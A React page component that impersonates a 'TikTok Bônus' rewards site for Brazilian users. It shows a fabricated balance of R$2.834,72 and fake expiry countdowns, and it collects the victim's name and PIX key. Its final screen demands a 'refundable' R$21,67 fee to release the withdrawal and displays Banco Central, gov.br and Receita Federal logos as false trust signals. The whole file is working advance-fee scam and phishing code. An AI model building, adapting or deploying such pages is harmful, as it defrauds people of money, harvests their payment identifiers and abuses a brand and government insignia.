import { useState, useEffect, useCallback, useRef } from 'react';
import '../styles/app.css';

// Currency animation helper
const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const easeOutCubic = (t: number) => 1 - Math.pow(1 - t, 3);

const SALDO_FINAL = 2834.72;
const SALDO_PONTOS = '28.347.200';

const Index = () => {
  const [currentScreen, setCurrentScreen] = useState('one');
  const [showPopupTwo, setShowPopupTwo] = useState(false);
  const [showStickyPopup, setShowStickyPopup] = useState(false);
  const [sacarEnabled, setSacarEnabled] = useState(false);
  const [animatedValue, setAnimatedValue] = useState('R$ 0,00');
  const [timer, setTimer] = useState({ minutes: 16, seconds: 38 });

  const loadingNavigateTimeoutRef = useRef<number | null>(null);
  const loadingStartRef = useRef<number | null>(null);

  // Modal states
  const [showModalFour, setShowModalFour] = useState(false);
  const [showModalFive, setShowModalFive] = useState(false);
  const [showModalSix, setShowModalSix] = useState(false);

  // Form states
  const [nome, setNome] = useState('');
  const [tipoChave, setTipoChave] = useState('');
  const [chavePix, setChavePix] = useState('');
  const [selectedValue, setSelectedValue] = useState('');

  // Loading states
  const [loadingText, setLoadingText] = useState('Validando dados...');
  const [loadingProgress, setLoadingProgress] = useState(0);

  // Timer countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev.seconds > 0) {
          return { ...prev, seconds: prev.seconds - 1 };
        } else if (prev.minutes > 0) {
          return { minutes: prev.minutes - 1, seconds: 59 };
        }
        return prev;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Currency animation
  const animateCurrency = useCallback((target: number) => {
    const duration = 2000;
    const startTime = Date.now();
    
    const animate = () => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const value = target * easeOutCubic(progress);
      setAnimatedValue(`R$ ${formatBR(value)}`);
      
      if (progress < 1) {
        requestAnimationFrame(animate);
      }
    };
    
    requestAnimationFrame(animate);
  }, []);

  // Show popup after screen one loads
  useEffect(() => {
    if (currentScreen === 'one') {
      animateCurrency(SALDO_FINAL);
      const timeout = setTimeout(() => {
        setShowPopupTwo(true);
        setSacarEnabled(true);
      }, 100);
      return () => clearTimeout(timeout);
    }
  }, [currentScreen, animateCurrency]);

  // Loading screen animation
  useEffect(() => {
    if (currentScreen !== 'seven') return;

    // Microtask fail-safe: garante que nunca ficará preso aqui (mesmo se timers forem bloqueados)
    let cancelled = false;
    Promise.resolve().then(() => {
      if (!cancelled) setCurrentScreen('nine');
    });

    const texts = ['Validando dados...', 'Conectando ao servidor...', 'Concluindo resgate...', 'Quase pronto...'];
    let currentIndex = 0;

    setLoadingText(texts[0]);
    setLoadingProgress(25);

    const intervalId = window.setInterval(() => {
      currentIndex = Math.min(currentIndex + 1, texts.length - 1);
      setLoadingText(texts[currentIndex]);
      setLoadingProgress((currentIndex + 1) * 25);

      if (currentIndex >= texts.length - 1) {
        window.clearInterval(intervalId);
      }
    }, 1200);

    // Fail-safe: caso o microtask seja interrompido por algum motivo raro
    const hardTimeoutId = window.setTimeout(() => {
      setLoadingText('Concluído.');
      setLoadingProgress(100);
      setCurrentScreen('nine');
    }, 7000);

    return () => {
      cancelled = true;
      window.clearInterval(intervalId);
      window.clearTimeout(hardTimeoutId);
    };
  }, [currentScreen]);

  // cleanup global do timeout extra do handleEnviarPix
  useEffect(() => {
    return () => {
      if (loadingNavigateTimeoutRef.current) {
        window.clearTimeout(loadingNavigateTimeoutRef.current);
      }
    };
  }, []);

  // Fail-safe extra (raf): garante navegação mesmo se timers forem "travados"
  useEffect(() => {
    if (currentScreen !== 'seven') {
      loadingStartRef.current = null;
      return;
    }

    loadingStartRef.current = Date.now();
    let rafId = 0;

    const tick = () => {
      const start = loadingStartRef.current ?? Date.now();
      const elapsed = Date.now() - start;

      // após 8s na tela, força sair
      if (elapsed >= 8000) {
        setLoadingText('Concluído.');
        setLoadingProgress(100);
        setCurrentScreen('nine');
        return;
      }

      rafId = window.requestAnimationFrame(tick);
    };

    rafId = window.requestAnimationFrame(tick);
    return () => window.cancelAnimationFrame(rafId);
  }, [currentScreen]);

  const handleSacar = () => {
    if (sacarEnabled) {
      setShowPopupTwo(false);
      setCurrentScreen('three');
    }
  };

  const handleSelectValue = (value: string) => {
    setSelectedValue(value);
  };

  const handleOpenModalFour = () => {
    setShowModalFour(true);
  };

  const handleSelectPixType = (type: string) => {
    setTipoChave(type);
    setShowModalSix(false);
    setChavePix('');
  };

  const handleEnviarPix = () => {
    if (nome && tipoChave && chavePix) {
      localStorage.setItem('userPixData', JSON.stringify({ nome, tipoChave, chavePix }));
      setShowModalSix(false);
      setShowModalFive(false);
      setShowModalFour(false);

      // Evita travar no loading: envia direto para a próxima tela
      setLoadingText('Validando dados...');
      setLoadingProgress(100);
      setCurrentScreen('nine');
    }
  };

  const getCurrentDate = () => {
    const now = new Date();
    return `${String(now.getDate()).padStart(2, '0')}/${String(now.getMonth() + 1).padStart(2, '0')}/${now.getFullYear()}`;
  };

  return (
    <main id="screens">
      {/* Screen One - Main */}
      <section id="one" className={`screen ${currentScreen === 'one' ? 'is-active' : ''}`}>
        <div className="title">TikTok Bônus</div>
        <div className="saldo">
          <div className="container-saldo">
            <div className="saldo-info">
              <div className="saldo-label">
                <span className="saldo-text">Seu saldo</span>
                <img src="/images/p-saldo.svg" alt="" className="p-saldo" />
              </div>
              <div className="saldo-valor">
                <span className="valor-currency valor-currency-dois valor-currency-tres">{animatedValue}</span>
              </div>
            </div>
            <div className="saldo-action">
              <button type="button" className="btn-sacar" disabled={!sacarEnabled} onClick={handleSacar}>
                <span className="btn-text">Sacar</span>
                <span className="pix-badge">
                  <img src="/images/pix-logo.svg" alt="" />
                </span>
              </button>
            </div>
          </div>
        </div>
        
        <div className="bloco-dois">
          <div className="parabens">
            <div className="parabens-txt">
              <span className="parabens-txtum">Parabéns!</span>
              <span className="parabens-txtdois">Você concluiu <span className="nobreak">todas as tarefas</span></span>
              <span className="parabens-valor">R$ {formatBR(SALDO_FINAL)}</span>
            </div>
            <img src="/images/parabens-img.png" alt="" className="parabens-img" />
          </div>
          <div className="line"></div>
          
          <div className="entre">
            <span className="entre-txt">Entre por 14 dias para ganhar
              <span className="entre-pts">8.414 pontos</span>
              <span className="entre-data">• 12 de nov - 25 de nov</span>
            </span>
            <button type="button" className="btn-concluido">
              <span className="btn-concluido-text">Concluído</span>
            </button>
          </div>
          
          <div className="concluiu">
            <span className="concluiu-txt">Você concluiu todos os dias de check-in.</span>
          </div>
          
          <div className="dia">
            <div className="day-tracker">
              {[50, 100, 150, 200, 250, 300].map((value, idx) => (
                <div key={idx} className="day-tracker__item">
                  <div className="day-tracker__box">
                    <div className="day-tracker__content">
                      <div className="day-tracker__coin">
                        <img src="/images/p-dia.svg" alt="" />
                      </div>
                      <div className="day-tracker__value">{value}</div>
                    </div>
                    <div className="day-tracker__overlay">
                      <div className="day-tracker__icon-wrapper">
                        <div className="day-tracker__icon-shape">
                          <img src="/images/fi-bs-check.svg" alt="" />
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="day-tracker__label">Dia 0{idx + 1}</div>
                </div>
              ))}
            </div>
          </div>
          
          <div className="line line-dois"></div>
          
          <div className="entre">
            <span className="entre-txt entre-txt-dois">Vê anúncios direcionados diariamente para ganhares até
              <span className="entre-pts">2.730 pontos</span>
              <span className="entre-data">• 30/30 anúncios assistidos</span>
            </span>
            <button type="button" className="btn-concluido">
              <span className="btn-concluido-text">Concluído</span>
            </button>
          </div>
          
          <div className="line line-dois"></div>
          
          <div className="entre">
            <span className="entre-txt entre-txt-dois">Assistir vídeos
              <span className="entre-pts">500 pontos</span>
            </span>
            <button type="button" className="btn-concluido">
              <span className="btn-concluido-text">Concluído</span>
            </button>
          </div>
          
          <div className="assista">
            <span className="assista-txt">Assista por 10 min</span>
          </div>
          
          <div className="barra">
            <div className="progress-bar">
              {[50, 100, 150, 225].map((pts, idx) => (
                <div key={idx} className="progress-step">
                  <div className="step-icon">
                    <img src="/images/p-assista.svg" alt="P" />
                  </div>
                  <span className="step-text">{pts} pontos</span>
                </div>
              ))}
            </div>
            
            <div className="line line-dois"></div>
            
            <div className="entre">
              <span className="entre-txt entre-txt-dois">Resgate suas recompensas e ganhe
                <span className="entre-pts">640 pontos</span>
                <span className="entre-data">• 8/8 resgatados</span>
              </span>
              <button type="button" className="btn-concluido">
                <span className="btn-concluido-text">Concluído</span>
              </button>
            </div>
            
            <div className="line line-dois"></div>
            
            <div className="entre">
              <span className="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
                <span className="entre-pts">996 pontos</span>
                <span className="entre-data">• 60 pesquisas feitas hoje</span>
              </span>
              <button type="button" className="btn-concluido">
                <span className="btn-concluido-text">Concluído</span>
              </button>
            </div>
            
            <div className="assista posicao-direita">
              <span className="assista-txt">Até 756 pontos</span>
            </div>
            
            <div className="progress-bar">
              <div className="progress-step hide">
                <div className="step-icon"><img src="/images/p-assista.svg" alt="P" /></div>
                <span className="step-text">16 pesquisas</span>
              </div>
              <div className="progress-step">
                <div className="step-icon"><img src="/images/p-assista.svg" alt="P" /></div>
                <span className="step-text">36 pesquisas</span>
              </div>
              <div className="progress-step">
                <div className="step-icon"><img src="/images/p-assista.svg" alt="P" /></div>
                <span className="step-text">60 pesquisas</span>
              </div>
            </div>
            
            <div className="obtem">
              <span className="obtem-txt">Obtém 21 pontos por escreveres uma consulta na barra de pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em "Podes gostar".</span>
            </div>
            
            <div className="line line-dois"></div>
            
            <div className="entre">
              <span className="entre-txt">Convide 1 amigo para se inscrever e ganhar
                <span className="entre-pts">100.000 pontos - 200.000 pontos</span>
              </span>
              <button type="button" className="btn-concluido">
                <span className="btn-concluido-text">Concluído</span>
              </button>
            </div>
          </div>
        </div>
      </section>

      {/* Popup Two - Prize Modal */}
      {showPopupTwo && currentScreen === 'one' && (
        <section id="two" className="screen is-modal is-active">
          <div className="modal-inner">
            <div className="popup">
              <img src="/images/gol.png" alt="" className="gol-img" />
              <span className="gol">Gol de Prêmios</span>
              <span className="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva.</span>
              <span className="valor-currency gol-valor valor-currency-dois valor-currency-quatro">R$ {formatBR(SALDO_FINAL)}</span>
              <div className="timer-wrapper expira-em-popup" style={{ background: 'none' }}>
                <div className="timer-label">Expira em</div>
                <div className="timer-clock">
                  <div className="timer-box">00</div>
                  <div className="timer-separator">:</div>
                  <div className="timer-box">{String(timer.minutes).padStart(2, '0')}</div>
                  <div className="timer-separator">:</div>
                  <div className="timer-box">{String(timer.seconds).padStart(2, '0')}</div>
                </div>
              </div>
              <button type="button" className="btn-obrigado" onClick={() => setShowPopupTwo(false)}>
                <span className="btn-text btn-textdois btn-txt-obrigado">Obrigado</span>
              </button>
            </div>
          </div>
        </section>
      )}

      {/* Screen Three - Withdraw */}
      <section id="three" className={`screen ${currentScreen === 'three' ? 'is-active' : ''}`}>
        <div className="expira-saldo">
          <div className="timer-wrapper">
            <p id="countdown-text">
              SEU SALDO EXPIRA EM <span id="timer">00 - {String(timer.minutes).padStart(2, '0')} - {String(timer.seconds).padStart(2, '0')}</span>
            </p>
          </div>
        </div>
        <div className="title">Resgatar recompensas</div>
        
        <div className="saldo saldo-dois">
          <div className="container-saldo">
            <div className="saldo-info saldo-info-dois">
              <div className="saldo-label">
                <span className="saldo-text saldo-text-dois">Seu saldo</span>
              </div>
              <div className="saldo-valor saldo-valor-dois">
                <span className="valor-currency valor-currency-dois">R$ {formatBR(SALDO_FINAL)}</span>
                <span className="total-pontos">= {SALDO_PONTOS} pontos</span>
              </div>
            </div>
            <div className="saldo-action">
              <span className="saldo-img"><img src="/images/p-saldo-maior.png" alt="" className="p-saldo p-saldo-maior" /></span>
            </div>
          </div>
        </div>
        
        <div className="linha"></div>
        
        <div className="saldo saldo-tres">
          <div className="container-saldo">
            <div className="saldo-info saldo-info-dois">
              <div className="saldo-valor saldo-valor-dois">
                <span className="total-pontos total-pontos-dois">Última recompensa: R$ 646,43</span>
              </div>
            </div>
          </div>
        </div>
        
        <div className="saldo saldo-sacar">
          <div className="container-saldo">
            <div className="saldo-info saldo-info-sacar">
              <div className="saldo-label">
                <span className="saldo-sacar-text">Sacar dinheiro</span>
              </div>
              <div className="saldo-valor">
                <span className="transferencia-txt">
                  <img src="/images/fi-rs-credit-card.png" alt="" />Transferência via /
                  <img src="/images/pix-logo.svg" alt="" className="pix-logo-transf" />
                </span>
              </div>
            </div>
          </div>
          
          <div className="widget-container">
            <div className="botoes-row botoes-row-sacar">
              {['R$1,5', 'R$5', 'R$10'].map((val) => (
                <button key={val} className={`btn-valor ${selectedValue === val ? 'btn-active' : ''}`} onClick={() => handleSelectValue(val)}>
                  {val}
                </button>
              ))}
            </div>
            <button className={`btn-valor display-total ${selectedValue === 'total' ? 'btn-active' : ''}`} onClick={() => handleSelectValue('total')}>
              R$ {formatBR(SALDO_FINAL)}
            </button>
          </div>
          
          <button 
            type="button" 
            className={`btn-obrigado btn-sacar-dois ${!selectedValue ? 'btn-sacar-indisponivel' : ''}`}
            onClick={handleOpenModalFour}
            disabled={!selectedValue}
          >
            <span className="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
          </button>
          
          <div className="obtem obtem-sacar sacar-dinheiro">
            <span className="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.</span>
          </div>
        </div>
        
        <div className="saldo saldo-sacar">
          <div className="container-saldo ctn-flor">
            <img src="/images/flor.png" alt="" className="flor" />
            <div className="saldo-info obtenha-title">
              <div className="saldo-label">
                <span className="saldo-sacar-text obtenha-txt">Obtenha Moedas para a LIVE</span>
              </div>
              <div className="saldo-valor saldo-valor-tres border-none">
                <span className="transferencia-txt moedas-txt">Use Moedas para enviar presentes virtuais para seus hosts de live Favoritos.</span>
              </div>
            </div>
          </div>
          <button type="button" className="btn-sacar-indisponivel">
            <span className="btn-text btn-indis">Indisponível</span>
          </button>
        </div>
        
        <div className="saldo saldo-sacar">
          <div className="container-saldo">
            <div className="saldo-info obtenha-title">
              <div className="saldo-label">
                <span className="saldo-sacar-text obtenha-txt">Recarga móvel</span>
              </div>
              <div className="saldo-valor saldo-valor-tres celular-recarga">
                <span className="ddd">+55</span>
                <span className="linha-ddd"></span>
                <div className="telefone">12345678901</div>
              </div>
            </div>
          </div>
          <button type="button" className="btn-sacar-indisponivel">
            <span className="btn-text btn-indis">Indisponível</span>
          </button>
          <div className="obtem obtem-sacar">
            <span className="obtem-txt recarga-txt">Você precisa de um saldo mínimo de R$10 para recarga de celular</span>
          </div>
        </div>
      </section>

      {/* Modal Four - Add Payment Method */}
      {showModalFour && (
        <section id="four" className="modal is-modal is-active">
          <div className="modal-inner inner-pop">
            <div className="saque-popup">
              <div className="title saque-title">Adicionar método de saque</div>
              <span className="pix-item" onClick={() => { setShowModalFive(true); }}>
                <div className="pix-icon">
                  <img src="/images/pix-solo.svg" alt="" className="pix-solo" />
                </div>
                <div className="pix-details">
                  <span className="pix-title">PIX</span>
                  <span className="pix-subtitle">Recebimento Imediato</span>
                </div>
                <span className="pix-arrow">
                  <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none">
                    <path d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z" fill="#7F7F7F" />
                  </svg>
                </span>
              </span>
            </div>
          </div>
        </section>
      )}

      {/* Modal Five - Link PIX */}
      {showModalFive && (
        <section id="five" className="screen is-modal is-active">
          <div className="modal-inner inner-pop saque-popup">
            <div className="title saque-title">Vincular PIX</div>
            <div className="form-container">
              <div className="form-group">
                <label className="field-label">Nome</label>
                <input type="text" placeholder="Nome completo" className="nome-completo" value={nome} onChange={(e) => setNome(e.target.value)} />
              </div>
              <div className="form-group">
                <label className="field-label">Tipo de Chave PIX</label>
                <div className="pix-selector" onClick={() => setShowModalSix(true)}>
                  <span className="placeholder-text">{tipoChave || 'Escolha o tipo de chave PIX'}</span>
                  <span className="arrow arrow-tois">
                    <svg xmlns="http://www.w3.org/2000/svg" width="5" height="9" viewBox="0 0 5 9" fill="none">
                      <path d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z" fill="#7F7F7F" />
                    </svg>
                  </span>
                </div>
              </div>
              <div className="form-group">
                <label className="field-label">Chave PIX</label>
                <div className="input-wrapper-disabled">
                  <input type="text" placeholder="Digite sua chave PIX" className="nome-completo" value={chavePix} onChange={(e) => setChavePix(e.target.value)} disabled={!tipoChave} />
                </div>
              </div>
              <button type="button" className={`btn-obrigado btn-sacar-dois btn-vincular ${(!nome || !tipoChave || !chavePix) ? 'btn-disabled' : ''}`} onClick={handleEnviarPix}>
                <span className="btn-text btn-textdois-sacar">Enviar</span>
              </button>
            </div>
          </div>
        </section>
      )}

      {/* Modal Six - Select PIX Type */}
      {showModalSix && (
        <section id="six" className="screen is-modal is-active">
          <div className="modal-inner inner-pop">
            <div className="saque-popup chave-pix">
              <div className="title saque-title">Chave PIX</div>
              <div className="selection-container">
                {['CPF', 'E-mail', 'Celular', 'Chave Aleatória'].map((type) => (
                  <div key={type} className="option-row" onClick={() => handleSelectPixType(type)}>
                    <label>
                      <span className="option-text">{type}</span>
                      <input type="radio" name="pix_key_type" checked={tipoChave === type} readOnly />
                      <span className="custom-radio"></span>
                    </label>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </section>
      )}

      {/* Screen Seven - Loading */}
      <section
        id="seven"
        aria-hidden="true"
        className={`screen ${currentScreen === 'seven' ? 'is-active' : ''}`}
      >
        <header className="loading-header">
          <div className="loading-logo">
            <img src="/images/tiktok-logo.png" alt="TikTok Logo" className="loading-logo-img" />
          </div>
        </header>
        <main className="loading-main-content">
          <div className="new-loading-container">
            <div className="new-loading-text">{loadingText}</div>
            <div className="new-progress-track">
              <div className="new-progress-bar" style={{ width: `${loadingProgress}%` }}></div>
            </div>
          </div>
        </main>
      </section>

      {/* Screen Nine - Confirmation */}
      <section id="nine" className={`screen ${(currentScreen === 'nine' || currentScreen === 'seven') ? 'is-active' : ''}`}>
        <div className="confirmation-container">
          <div className="confirmation-header">
            <div className="confirmation-logo">
              <img src="/images/tiktok-logo.png" alt="TikTok" />
            </div>
          </div>
          
          <div className="confirmation-section confirmation-balance">
            <div className="confirmation-balance-title">SALDO DISPONÍVEL</div>
            <div className="confirmation-balance-amount">R$ {formatBR(SALDO_FINAL)}</div>
            <div className="confirmation-balance-subtitle">Aguardando confirmação para saque</div>
          </div>
          
          <div className="confirmation-section">
            <div className="confirmation-section-title">CONFIRMAÇÃO DE IDENTIDADE</div>
            <div className="confirmation-fee-amount">
              R$ 21,67 <span className="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
            </div>
            <div className="confirmation-fee-description">
              Taxa obrigatória para liberação do saque no valor de <span className="bold">R$ {formatBR(SALDO_FINAL)}</span>. O valor de <span className="bold">R$21,67</span> será reembolsado integralmente para você em 1 minuto.
            </div>
          </div>
          
          <div className="confirmation-section">
            <div className="confirmation-section-title">DADOS PARA REEMBOLSO</div>
            <div className="confirmation-receipt-grid">
              <div className="confirmation-receipt-item">
                <div className="confirmation-receipt-label">Nome</div>
                <div className="confirmation-receipt-value">{nome}</div>
              </div>
              <div className="confirmation-receipt-item">
                <div className="confirmation-receipt-label">Data</div>
                <div className="confirmation-receipt-value">{getCurrentDate()}</div>
              </div>
              <div className="confirmation-receipt-item">
                <div className="confirmation-receipt-label">Chave PIX</div>
                <div className="confirmation-receipt-value">{tipoChave}</div>
              </div>
              <div className="confirmation-receipt-item">
                <div className="confirmation-receipt-label">Valor a receber</div>
                <div className="confirmation-receipt-value bold">R$ {formatBR(SALDO_FINAL)}</div>
              </div>
              <div className="confirmation-pix-key">{chavePix}</div>
            </div>
          </div>
          
          <div className="confirmation-divider"></div>
          
          <div className="confirmation-section">
            <div className="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
            <div className="confirmation-requirements-grid">
              <div className="confirmation-requirement-item">
                <div className="confirmation-requirement-icon">1</div>
                <div className="confirmation-requirement-content">
                  <div className="confirmation-requirement-title">Pagar taxa de confirmação</div>
                  <div className="confirmation-requirement-description">R$ 21,67 para verificação de identidade</div>
                </div>
              </div>
              <div className="confirmation-requirement-item">
                <div className="confirmation-requirement-icon confirmation-reembolso">✓</div>
                <div className="confirmation-requirement-content">
                  <div className="confirmation-requirement-title confirmation-reembolso">Receber reembolso automático</div>
                  <div className="confirmation-requirement-description">Valor devolvido em 1 minuto</div>
                </div>
              </div>
              <div className="confirmation-requirement-item">
                <div className="confirmation-requirement-icon">3</div>
                <div className="confirmation-requirement-content">
                  <div className="confirmation-requirement-title">Acessar saldo completo</div>
                  <div className="confirmation-requirement-description">R$ {formatBR(SALDO_FINAL)} liberado para saque</div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="confirmation-section">
            <button className="confirmation-cta-button">Pagar taxa para Liberar Saque</button>
            <div className="confirmation-timer">⏱️ Reembolso automático em 1 minuto</div>
          </div>
          
          <div className="confirmation-security-grid">
            <div className="confirmation-security-item">
              <div className="confirmation-security-label">
                <img src="/images/bacen.png" alt="" className="img-bacen" />
              </div>
            </div>
            <div className="confirmation-security-item">
              <div className="confirmation-security-label">
                <img src="/images/gov-br.webp" alt="" className="img-gov-br" />
              </div>
            </div>
            <div className="confirmation-security-item">
              <div className="confirmation-security-label">
                <img src="/images/receitafederal.png" alt="" className="img-receitafederal" />
              </div>
            </div>
          </div>
          
          <div className="confirmation-footer">
            <div className="confirmation-footer-text">Processo 100% seguro</div>
            <a href="#" className="confirmation-footer-link">Precisa de ajuda?</a>
          </div>
        </div>
      </section>
    </main>
  );
};

export default Index;
